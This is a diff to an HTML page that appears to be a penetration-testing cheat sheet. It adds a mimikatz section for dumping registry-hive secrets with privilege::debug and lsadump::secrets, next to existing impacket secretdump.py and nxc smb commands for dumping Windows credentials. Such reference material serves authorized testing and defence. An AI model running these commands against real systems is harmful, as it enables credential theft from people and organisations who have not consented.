@@ -882,6 +882,12 @@ nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="o">
 <p>Dump all available credentials with impacket's <code>secretdump.py</code> script:</p>
 <div class="highlight"><pre><span></span><code>secretdump.py<span class="w"> </span><span class="o">[[</span>domain/<span class="o">]</span>username<span class="o">[</span>:password<span class="o">]</span>@<span class="o">]</span>&lt;targetName<span class="w"> </span>or<span class="w"> </span>address&gt;
 </code></pre></div>
+<p>Dumping secrets from registry hive with mimikatz:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Must return "Privilege '20' OK" </span>
+privilege::debug
+
+lsadump::secrets
+</code></pre></div>
 <p>Dumping credentials with mimikatz:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Must return "Privilege '20' OK" </span>
 privilege::debug
